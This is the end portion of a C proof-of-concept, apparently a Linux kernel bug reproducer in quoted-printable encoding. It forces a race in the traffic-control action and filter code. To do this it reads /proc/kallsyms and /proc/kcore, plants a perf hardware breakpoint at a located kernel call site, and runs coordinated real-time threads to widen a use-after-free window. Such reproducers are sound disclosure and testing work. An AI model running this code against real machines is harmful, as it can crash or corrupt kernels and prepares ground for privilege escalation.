clock_gettime(CLOCK_MONOTONIC, &ts);
return ts.tv_sec * 1000000000L + ts.tv_nsec;
}

static void sem_wait_intr(sem_t *sem)
{
while (sem_wait(sem) && errno =3D=3D EINTR)
;
}

static int perf_event_open_local(struct perf_event_attr *attr, pid_t pid,
int cpu, int group_fd, unsigned long flags)
{
return syscall(SYS_perf_event_open, attr, pid, cpu, group_fd, flags);
}

static unsigned long kallsyms_lookup(const char *wanted)
{
char name[512];
unsigned long addr;
char type;
FILE *file;

file =3D fopen("/proc/kallsyms", "r");
if (!file)
return 0;
while (fscanf(file, "%lx %c %511s", &addr, &type, name) =3D=3D 3) {
if (!strcmp(name, wanted)) {
fclose(file);
return addr;
}
}
fclose(file);
return 0;
}

static int kcore_read(void *buf, size_t len, unsigned long addr)
{
Elf64_Ehdr ehdr;
Elf64_Phdr *phdrs =3D NULL;
ssize_t got;
int fd =3D -1;
int ret =3D -1;
int i;

fd =3D open("/proc/kcore", O_RDONLY);
if (fd < 0)
goto out;
got =3D pread(fd, &ehdr, sizeof(ehdr), 0);
if (got !=3D sizeof(ehdr) || memcmp(ehdr.e_ident, ELFMAG, SELFMAG) ||
   ehdr.e_ident[EI_CLASS] !=3D ELFCLASS64 ||
   ehdr.e_phentsize !=3D sizeof(Elf64_Phdr) || !ehdr.e_phnum)
goto out;
phdrs =3D calloc(ehdr.e_phnum, sizeof(*phdrs));
if (!phdrs)
goto out;
got =3D pread(fd, phdrs, ehdr.e_phnum * sizeof(*phdrs), ehdr.e_phoff);
if (got !=3D (ssize_t)(ehdr.e_phnum * sizeof(*phdrs)))
goto out;
for (i =3D 0; i < ehdr.e_phnum; i++) {
Elf64_Addr delta;

if (phdrs[i].p_type !=3D PT_LOAD || addr < phdrs[i].p_vaddr)
continue;
delta =3D addr - phdrs[i].p_vaddr;
if (delta > phdrs[i].p_filesz ||
   len > phdrs[i].p_filesz - delta)
continue;
got =3D pread(fd, buf, len, phdrs[i].p_offset + delta);
if (got =3D=3D (ssize_t)len)
ret =3D 0;
break;
}
out:
free(phdrs);
if (fd >=3D 0)
close(fd);
return ret;
}

static unsigned long find_breakpoint(void)
{
#if defined(__x86_64__)
enum { SCAN_LEN =3D 0x4000 };
unsigned long function =3D kallsyms_lookup("tca_action_gd");
unsigned long callee =3D kallsyms_lookup("refcount_dec_and_mutex_lock");
unsigned char *code;
unsigned long result =3D 0;
size_t i;

if (!function || !callee)
return 0;
code =3D malloc(SCAN_LEN);
if (!code)
return 0;
if (kcore_read(code, SCAN_LEN, function))
goto out;
for (i =3D 0; i + 5 <=3D SCAN_LEN; i++) {
int32_t displacement;
unsigned long target;

if (code[i] !=3D 0xe8)
continue;
memcpy(&displacement, code + i + 1, sizeof(displacement));
target =3D function + i + 5 + (long)displacement;
if (target =3D=3D callee) {
/* The first matching call is tcf_action_put(); the later
* match belongs to tcf_action_put_many() cleanup.
*/
result =3D function + i + 5;
break;
}
}
out:
free(code);
return result;
#else
return 0;
#endif
}

static void *racer_thread(void *arg)
{
struct race_ctx *ctx =3D arg;
int fd;

pin_cpu(0);
atomic_store_explicit(&ctx->racer_tid, (int)syscall(SYS_gettid),
     memory_order_release);
fd =3D nl_open();
for (;;) {
sem_wait_intr(&ctx->racer_start);
if (atomic_load_explicit(&ctx->stop, memory_order_acquire))
break;
{
ioctl(ctx->perf_fd, PERF_EVENT_IOC_DISABLE, 0);
ioctl(ctx->perf_fd, PERF_EVENT_IOC_RESET, 0);
ioctl(ctx->perf_fd, PERF_EVENT_IOC_ENABLE, 0);
ctx->racer_ret =3D del_action(fd, ctx->target);
ioctl(ctx->perf_fd, PERF_EVENT_IOC_DISABLE, 0);
}
ctx->racer_send_ns =3D last_send_ns;
sem_post(&ctx->done);
}
close(fd);
return NULL;
}

static void *controller_thread(void *arg)
{
struct race_ctx *ctx =3D arg;
int fd;

pin_cpu(0);
set_fifo(80);
atomic_store_explicit(&ctx->controller_tid,
     (int)syscall(SYS_gettid),
     memory_order_release);
fd =3D nl_open();
for (;;) {
sem_wait_intr(&ctx->controller_start);
if (atomic_load_explicit(&ctx->stop, memory_order_acquire))
break;
{
sigset_t set;
siginfo_t info;
struct timespec timeout =3D { .tv_nsec =3D 2000000L };

sigemptyset(&set);
sigaddset(&set, SIGIO);
sem_post(&ctx->controller_armed);
ctx->perf_signal_seen =3D
sigtimedwait(&set, &info, &timeout) >=3D 0;
ctx->actual_wake_ns =3D 0;
}
ctx->delete_ret =3D del_filter(fd, ctx->old_prio, 1);
atomic_store_explicit(&ctx->guard_count, 0,
     memory_order_release);
atomic_store_explicit(&ctx->guard_release, 0,
     memory_order_release);
sem_post(&ctx->guard_start[0]);
sem_post(&ctx->guard_start[1]);
sem_post(&ctx->sync_start);
sem_wait_intr(&ctx->sync_done);
sem_wait_intr(&ctx->guard_done);
sem_post(&ctx->creator_start);
busy_us(ctx->headstart_us);
ctx->controller_release_abs_ns =3D mono_ns();
sem_post(&ctx->done);
}
close(fd);
return NULL;
}

static void *guard_thread(void *arg)
{
struct guard_ctx *guard =3D arg;
struct race_ctx *ctx =3D guard->race;

pin_cpu(0);
set_fifo(70);
for (;;) {
sem_wait_intr(&ctx->guard_start[guard->id]);
if (atomic_load_explicit(&ctx->stop, memory_order_acquire))
break;
while (!atomic_load_explicit(&ctx->guard_release,
    memory_order_acquire))
sched_yield();
if (atomic_fetch_add_explicit(&ctx->guard_count, 1,
     memory_order_acq_rel) =3D=3D 1)
sem_post(&ctx->guard_done);
}
return NULL;
}

static void *sync_thread(void *arg)
{
struct race_ctx *ctx =3D arg;

pin_cpu(2);
set_fifo(60);
for (;;) {
sem_wait_intr(&ctx->sync_start);
if (atomic_load_explicit(&ctx->stop, memory_order_acquire))
break;
ctx->sync_ret =3D syscall(SYS_membarrier,
MEMBARRIER_CMD_GLOBAL, 0, 0);
/* queue_rcu_work() queues the flower destructor after the
* grace period.  Keep the racer starved while that ordered
* workqueue gets CPU time.
*/
sleep_us(2000);
atomic_store_explicit(&ctx->guard_release, 1,
     memory_order_release);
sem_post(&ctx->sync_done);
}
return NULL;
}

static void *creator_thread(void *arg)
{
struct race_ctx *ctx =3D arg;
__u32 indices[ACTION_COUNT];
int fd;

pin_cpu(1);
set_fifo(60);
fd =3D nl_open();
for (;;) {
sem_wait_intr(&ctx->creator_start);
if (atomic_load_explicit(&ctx->stop, memory_order_acquire))
break;
fill_indices(indices, ctx->target);
ctx->creator_start_abs_ns =3D mono_ns();
ctx->creator_ret =3D add_filter_many(fd, ctx->new_prio, 1, indices);
ctx->creator_send_ns =3D last_send_ns;
ctx->creator_send_start_abs_ns =3D last_send_start_ns;
sem_post(&ctx->done);
}
close(fd);
return NULL;
}

static int setup_netns(void)
{
int fd;

if (unshare(CLONE_NEWNET))
return 1;
fd =3D nl_open();
if (fd < 0)
return 1;
ifindex =3D if_nametoindex("lo");
if (!ifindex)
ifindex =3D 1;
if (link_up(fd) || add_clsact(fd)) {
close(fd);
return 1;
}
close(fd);
return 0;
}

static int run_stock_race(void)
{
struct race_ctx ctx =3D {};
struct perf_event_attr attr =3D {
.type =3D PERF_TYPE_BREAKPOINT,
.size =3D sizeof(attr),
.bp_type =3D HW_BREAKPOINT_X,
.bp_addr =3D breakpoint_addr,
/* x86 requires sizeof(long) for execution breakpoints. */
.bp_len =3D sizeof(long),
.sample_period =3D 1,
.sample_type =3D PERF_SAMPLE_IP,
.disabled =3D 1,
.exclude_user =3D 1,
.exclude_hv =3D 1,
.wakeup_events =3D 1,
};
struct f_owner_ex owner =3D { .type =3D F_OWNER_TID };
sigset_t sigio_set;
pthread_t racer, controller, creator, guards[2], syncer;
struct guard_ctx guard_ctxs[2] =3D {
{ .race =3D &ctx, .id =3D 0 },
{ .race =3D &ctx, .id =3D 1 },
};
int setup_errors =3D 0;
int fd, i;

pin_cpu(3);
sigemptyset(&sigio_set);
sigaddset(&sigio_set, SIGIO);
pthread_sigmask(SIG_BLOCK, &sigio_set, NULL);
ctx.perf_fd =3D -1;
if (setup_netns())
return 1;
fd =3D nl_open();
sem_init(&ctx.racer_start, 0, 0);
sem_init(&ctx.controller_start, 0, 0);
sem_init(&ctx.controller_armed, 0, 0);
sem_init(&ctx.creator_start, 0, 0);
sem_init(&ctx.guard_start[0], 0, 0);
sem_init(&ctx.guard_start[1], 0, 0);
sem_init(&ctx.guard_done, 0, 0);
sem_init(&ctx.sync_start, 0, 0);
sem_init(&ctx.sync_done, 0, 0);
sem_init(&ctx.done, 0, 0);
if (pthread_create(&creator, NULL, creator_thread, &ctx) ||
   pthread_create(&racer, NULL, racer_thread, &ctx) ||
   pthread_create(&guards[0], NULL, guard_thread, &guard_ctxs[0]) ||
   pthread_create(&guards[1], NULL, guard_thread, &guard_ctxs[1]) ||
   pthread_create(&syncer, NULL, sync_thread, &ctx) ||
   pthread_create(&controller, NULL, controller_thread, &ctx))
return 1;
while (!atomic_load_explicit(&ctx.racer_tid, memory_order_acquire) ||
      !atomic_load_explicit(&ctx.controller_tid, memory_order_acquire))
sched_yield();
ctx.perf_fd =3D perf_event_open_local(&attr,
atomic_load_explicit(&ctx.racer_tid, memory_order_acquire),
-1, -1, 0);
if (ctx.perf_fd < 0)
return 1;
owner.pid =3D atomic_load_explicit(&ctx.controller_tid,
memory_order_acquire);
if (fcntl(ctx.perf_fd, F_SETOWN_EX, &owner) ||
   fcntl(ctx.perf_fd, F_SETSIG, SIGIO) ||
   fcntl(ctx.perf_fd, F_SETFL, O_ASYNC | O_NONBLOCK))
return 1;
for (i =3D 0; i < RACE_TRIALS; i++) {
long head_slot =3D (i * 73L) % HEADSTART_SLOTS;

ctx.target =3D TARGET_START + (__u32)i * 128U;
ctx.old_prio =3D 1 + (i * 2) % 60000;
ctx.new_prio =3D ctx.old_prio + 1;
ctx.detector_prio =3D 0;
ctx.period =3D 1;
ctx.wake_ns =3D 1;
ctx.headstart_us =3D HEADSTART_MIN_US + head_slot;
if (add_filter(fd, ctx.old_prio, 1, ctx.target)) {
setup_errors++;
continue;
}
sem_post(&ctx.controller_start);
sem_wait_intr(&ctx.controller_armed);
sem_post(&ctx.racer_start);
sem_wait_intr(&ctx.done);
sem_wait_intr(&ctx.done);
sem_wait_intr(&ctx.done);
del_filter(fd, ctx.old_prio, 1);
del_filter(fd, ctx.new_prio, 1);
}
atomic_store_explicit(&ctx.stop, 1, memory_order_release);
sem_post(&ctx.racer_start);
sem_post(&ctx.controller_start);
sem_post(&ctx.creator_start);
sem_post(&ctx.guard_start[0]);
sem_post(&ctx.guard_start[1]);
sem_post(&ctx.sync_start);
pthread_join(racer, NULL);
pthread_join(controller, NULL);
pthread_join(creator, NULL);
pthread_join(guards[0], NULL);
pthread_join(guards[1], NULL);
pthread_join(syncer, NULL);
close(ctx.perf_fd);
close(fd);
return setup_errors ? 1 : 0;
}

int main(int argc, char **argv)
{
char *end;
unsigned long addr;

srand(getpid());
if (argc > 1 && strcmp(argv[1], "stock") &&
   strcmp(argv[1], "root") && strcmp(argv[1], "auto")) {
errno =3D 0;
addr =3D strtoul(argv[1], &end, 0);
if (errno || !addr || *end)
return 2;
breakpoint_addr =3D addr;
}
if (!breakpoint_addr) {
breakpoint_addr =3D find_breakpoint();
if (!breakpoint_addr)
return 2;
}
return run_stock_race();
}
```
